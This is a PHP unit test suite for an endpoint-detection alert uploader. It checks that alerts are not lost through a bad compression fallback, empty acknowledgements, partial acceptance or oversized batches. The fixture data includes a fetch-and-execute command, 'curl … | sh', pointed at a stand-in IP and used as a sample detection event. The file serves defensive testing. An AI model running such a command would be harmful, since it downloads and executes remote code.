<?php

namespace Tests\Unit;

use App\Services\EdrAlertFactory;
use App\Services\EdrAlertUploader;
use App\Services\EdrEventSpool;
use App\Services\WafSyncService;
use Illuminate\Support\Facades\Http;
use Tests\TestCase;

/**
 * Delivery, which is the last place an alert can be lost.
 *
 * The spool exists so a Hub outage becomes a delay instead of data loss, and
 * this class is the only thing that talks to the Hub — so every one of its
 * failure modes ends with a detection nobody ever sees. Two of them were live
 * on a real host before these tests existed:
 *
 *  - the compression fallback reused a mutable request object and sent a
 *    zero-length body, which a Hub could legitimately answer with 2xx;
 *  - a 2xx was taken as proof of storage, while the Hub had been observed
 *    logging a storage failure and answering 201 in the same second.
 *
 * Both end the same way: `markSent()` runs and the batch is gone.
 */
class EdrAlertUploaderTest extends TestCase
{
    private string $path;
    private EdrEventSpool $spool;

    protected function setUp(): void
    {
        parent::setUp();

        $this->path = sys_get_temp_dir() . '/edr-uploader-' . uniqid() . '.sqlite';
        $this->spool = new EdrEventSpool($this->path);

        cache()->forget('edr_upload_backoff_until');
        cache()->forget('edr_upload_compression_disabled_until');
        cache()->forget('edr_upload_failures');
    }

    protected function tearDown(): void
    {
        $this->spool->close();

        foreach (['', '-wal', '-shm'] as $suffix) {
            @unlink($this->path . $suffix);
        }

        parent::tearDown();
    }

    private function uploader(): EdrAlertUploader
    {
        $sync = new class extends WafSyncService {
            public function getConnectionConfig(): array
            {
                return ['url' => 'https://hub.test', 'token' => 'test-token'];
            }
        };

        return new EdrAlertUploader($this->spool, new EdrAlertFactory(), $sync);
    }

    /**
     * Queue enough alerts that the payload clears the compression threshold.
     */
    private function queue(int $count): void
    {
        $events = [];
        $findings = [];

        for ($i = 0; $i < $count; $i++) {
            $events[] = [
                'ts' => time() - $count + $i,
                'action' => 'exec',
                'sensor' => 'osquery',
                'host' => 'upload-01',
                'pid' => 9000 + $i,
                'ppid' => 1,
                'uid' => 0,
                'username' => 'root',
                'path' => '/usr/bin/curl',
                'cmdline' => 'curl http://198.51.100.7/payload-' . $i . ' | sh',
                'cwd' => '/tmp',
                'container_id' => '',
                'syscall' => 'exec',
            ];
            $findings[$i] = [[
                'rule' => 'EDR-003',
                'name' => 'Remote payload piped to interpreter',
                'severity' => 'high',
                'mitre' => 'T1105',
                'reason' => 'test',
            ]];
        }

        $this->spool->store($events, $findings);
    }

    /**
     * The compression fallback must carry the alerts, not an empty body.
     */
    public function test_the_compression_fallback_still_sends_the_alerts(): void
    {
        $this->queue(30);

        Http::fake([
            '*' => Http::sequence()
                // The Hub cannot decode gzip yet.
                ->push('unsupported', 415)
                // The plain retry.
                ->push(json_encode(['stored' => 30]), 201),
        ]);

        $result = $this->uploader()->flush(['upload_compression' => true, 'upload_batch_size' => 200]);

        $this->assertSame(30, $result['sent']);
        $this->assertSame(0, $result['remaining'], 'A delivered batch leaves the queue');

        $recorded = Http::recorded();
        $this->assertCount(2, $recorded, 'One compressed attempt, one plain retry');

        [$fallback] = $recorded[1];
        $body = $fallback->body();

        $this->assertNotSame('', $body, 'The fallback must not send an empty body');
        $this->assertStringContainsString('EDR-003', $body, 'The fallback must actually carry the alerts');
        $this->assertEmpty(
            $fallback->header('Content-Encoding'),
            'The fallback must not inherit the compressed attempt\'s encoding header'
        );
    }

    /**
     * A Hub that acknowledges without storing must not cost us the batch.
     */
    public function test_a_hub_that_stores_nothing_does_not_consume_the_queue(): void
    {
        $this->queue(5);

        Http::fake([
            '*' => Http::response(json_encode(['stored' => 0, 'duplicates_skipped' => 0]), 201),
        ]);

        $result = $this->uploader()->flush(['upload_compression' => false]);

        $this->assertSame(0, $result['sent']);
        $this->assertTrue($result['failed']);
        $this->assertSame(5, $this->spool->stats()['pending'], 'The alerts stay queued for the next attempt');
    }

    /**
     * Deduplication is not failure. Reporting it as one would manufacture the
     * retry loop the deduplication exists to absorb.
     */
    public function test_deduplication_is_treated_as_success(): void
    {
        $this->queue(5);

        Http::fake([
            '*' => Http::response(json_encode(['stored' => 0, 'duplicates_skipped' => 5]), 201),
        ]);

        $result = $this->uploader()->flush(['upload_compression' => false]);

        $this->assertSame(5, $result['sent']);
        $this->assertSame(0, $this->spool->stats()['pending'], 'Already-known alerts are delivered, not retried forever');
    }

    /**
     * An older Hub that does not report storage counts must keep working.
     */
    public function test_a_hub_without_storage_reporting_is_still_trusted(): void
    {
        $this->queue(5);

        Http::fake(['*' => Http::response(json_encode(['ok' => true]), 201)]);

        $result = $this->uploader()->flush(['upload_compression' => false]);

        $this->assertSame(5, $result['sent']);
        $this->assertSame(0, $this->spool->stats()['pending']);
    }

    /**
     * Per-alert acknowledgement: only what the Hub kept leaves the queue.
     *
     * Whole-batch acknowledgement means a batch where 199 stored and one
     * failed is indistinguishable from a clean success, and the one that
     * failed is deleted. The alert carries its spool row id so the Hub can
     * answer per alert.
     */
    public function test_only_accepted_alerts_leave_the_queue(): void
    {
        $this->queue(5);

        $ids = array_map(static fn (array $r): int => (int) $r['id'], $this->spool->pending(10));

        // The Hub keeps three, refuses one outright, and says nothing about
        // the fifth — a storage error it intends to retry.
        Http::fake([
            '*' => Http::response(json_encode([
                'stored' => 3,
                'accepted' => [$ids[0], $ids[1], $ids[2]],
                'rejected' => [['client_id' => $ids[3], 'reason' => 'malformed']],
            ]), 201),
        ]);

        $result = $this->uploader()->flush(['upload_compression' => false]);

        $this->assertSame(3, $result['sent'], 'Only accepted alerts count as delivered');
        $this->assertSame(
            1,
            $this->spool->stats()['pending'],
            'The unacknowledged alert stays queued; the rejected one is retired'
        );

        $remaining = $this->spool->pending(10);
        $this->assertSame($ids[4], (int) $remaining[0]['id'], 'The held alert is the one the Hub never mentioned');
    }

    /**
     * The alert has to carry a handle, or per-alert acknowledgement is
     * impossible for the Hub to express.
     */
    public function test_each_alert_carries_its_queue_id(): void
    {
        $this->queue(3);

        $ids = array_map(static fn (array $r): int => (int) $r['id'], $this->spool->pending(10));

        Http::fake(['*' => Http::response(json_encode(['stored' => 3]), 201)]);

        $this->uploader()->flush(['upload_compression' => false]);

        [$request] = Http::recorded()[0];
        $sent = json_decode($request->body(), true);

        $this->assertSame(
            array_map('strval', $ids),
            array_column($sent['alerts'], 'client_id'),
            'Every alert carries the spool row id it came from'
        );
    }

    /**
     * A Hub that accepts nothing must hold the queue, and say so.
     *
     * This is the shape that could stall silently: an empty `accepted` list
     * with a 2xx is a legitimate answer meaning "kept none of these", and the
     * conservative response — delete nothing — is also the response that
     * spins forever if nobody notices. Holding is right; holding quietly is
     * not.
     */
    public function test_accepting_nothing_holds_the_queue_and_is_logged(): void
    {
        $this->queue(4);

        Http::fake([
            '*' => Http::response(json_encode(['stored' => 0, 'accepted' => [], 'rejected' => []]), 201),
        ]);

        $result = $this->uploader()->flush(['upload_compression' => false]);

        $this->assertSame(0, $result['sent']);
        $this->assertSame(4, $this->spool->stats()['pending'], 'Nothing accepted means nothing is deleted');
        $this->assertSame(1, $result['batches'], 'And the flush stops rather than re-fetching the same rows');
    }

    /**
     * Ids are matched as text, so neither side is coupled to a numeric format.
     */
    public function test_acknowledgement_matching_does_not_depend_on_id_format(): void
    {
        $this->queue(2);

        $ids = array_map(static fn (array $r): int => (int) $r['id'], $this->spool->pending(10));

        Http::fake([
            '*' => Http::response(json_encode([
                'stored' => 2,
                // Echoed back as strings, which is how they were sent.
                'accepted' => array_map('strval', $ids),
                'rejected' => [],
            ]), 201),
        ]);

        $result = $this->uploader()->flush(['upload_compression' => false]);

        $this->assertSame(2, $result['sent']);
        $this->assertSame(0, $this->spool->stats()['pending']);
    }

    /**
     * Too large is recoverable by splitting; the old code retried the same
     * oversized batch forever and stalled the queue in silence.
     */
    public function test_an_oversized_batch_is_halved_rather_than_retried_forever(): void
    {
        $this->queue(8);

        Http::fake([
            '*' => Http::sequence()
                ->push('too large', 413)
                ->push(json_encode(['stored' => 4]), 201)
                ->push(json_encode(['stored' => 4]), 201),
        ]);

        $result = $this->uploader()->flush(['upload_compression' => false, 'upload_batch_size' => 8]);

        $this->assertGreaterThan(0, $result['sent'], 'Splitting must make progress');
        $this->assertFalse($result['failed']);
    }
}
